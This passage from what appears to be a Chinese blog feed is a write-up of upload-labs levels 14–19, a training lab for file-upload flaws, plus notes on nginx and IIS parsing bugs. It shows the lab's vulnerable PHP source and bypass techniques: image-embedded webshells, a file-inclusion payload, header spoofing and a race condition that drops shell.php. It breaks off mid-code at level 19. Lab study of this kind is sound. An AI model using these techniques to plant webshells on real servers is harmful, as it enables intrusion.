<p>nginx解析漏洞(php.ini开启fix_pathinfo)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.php --&gt; xxx.jpg%00.php      &#x2F;&#x2F;Nginx &lt;8.03 空字节代码执行漏洞</span><br></pre></td></tr></table></figure>
<h3 id="四-IIS7-5解析漏洞"><a href="#四-IIS7-5解析漏洞" class="headerlink" title="(四)IIS7.5解析漏洞"></a>(四)IIS7.5解析漏洞</h3><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs学习下篇</title>
    <url>/2021/04/24/upload-labs%E5%AD%A6%E4%B9%A0%E4%B8%8B%E7%AF%87/</url>
    <content><![CDATA[<h1 id="upload-labs靶场训练篇（windows版21题）14-21题"><a href="#upload-labs靶场训练篇（windows版21题）14-21题" class="headerlink" title="upload-labs靶场训练篇（windows版21题）14-21题"></a>upload-labs靶场训练篇（windows版21题）14-21题</h1><p>upload-labs为文件上传的训练靶场，目前一共有21关，基本涵盖了目前全部的文件上传漏洞。此篇为下篇。</p>
<span id="more"></span>
<h2 id="level-14-图片马之文件头检测"><a href="#level-14-图片马之文件头检测" class="headerlink" title="level-14(图片马之文件头检测)"></a>level-14(图片马之文件头检测)</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>图片马</p>
<p>拓展一下如何制作图片马：</p>
<p>思路：上传图片马，制作：<code>copy x.jpg/b + x.php/a xx.jpg</code>，上传后需要结合文件包含漏洞利用，或者目标服务器支持以php解析.jpg后缀，这里需要注意的是图片马中的一句话能写到中间尽量写到中间，真实环境不容易被发现，可用winhex或bp修改<br>copy使用注意事项：图片一定要在copy后面，否则创建出来的木马图片有可能无法显示，例如，<code>copy x.php/a + x.gif/b xx.gif</code>，xx.gif就无法显示。</p>
<p>本题上传图片马后，利用作者留下的include.php来验证。</p>
<p>payload:<code>include.php?file=upload/xx.gif</code></p>
<p>执行<code>phpinfo();</code>成功</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h2><h3 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>本题检验文件头，采用:<code>GIF89a</code>来绕过，详细步骤与上题一样。</p>
<p>拓展图片文件头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JPEG (jpg)，文件头hex：FF D8 FF</span><br><span class="line">PNG (png)，文件头hex：89 50 4E 47</span><br><span class="line">GIF (gif)，文件头hex：47 49 46 38（也就是GIF89a）</span><br></pre></td></tr></table></figure>
<h2 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>与14和15的方法一样。需要环境：PHP版本大于5.2.10，且开启php_exif扩展</p>
<h2 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>二次渲染，传gif。具体上传方式会在总结的笔记中详细记录</p>
<h2 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答:"></a>解答:</h3><p>审计代码发现：rename修改名称，unlink删除文件，我们在他删除之前再次上传，使用条件竞争</p>
<p><img src="https://i.loli.net/2021/04/26/vwViksmqCyzrUMo.png" alt="image-20210426201242962"></p>
<p>发送到爆破，修改一下参数：</p>
<p><img src="https://i.loli.net/2021/04/26/wg5E7ZqakCUOP4d.png" alt="image-20210426210246728"></p>
<p>no payload 无限次循环</p>
<p>开始攻击。然后以同样的方法访问<code>write_shell.php</code>。当访问到相应为200后，会自动生成<code>shell.php</code>。</p>
<p><img src="https://i.loli.net/2021/04/26/woQyia5GBOZjlnc.png" alt="image-20210426210652361"></p>
<p>访问即可。</p>
<h2 id="level-19"><a href="#level-19" class="headerlink" title="level-19"></a>level-19</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    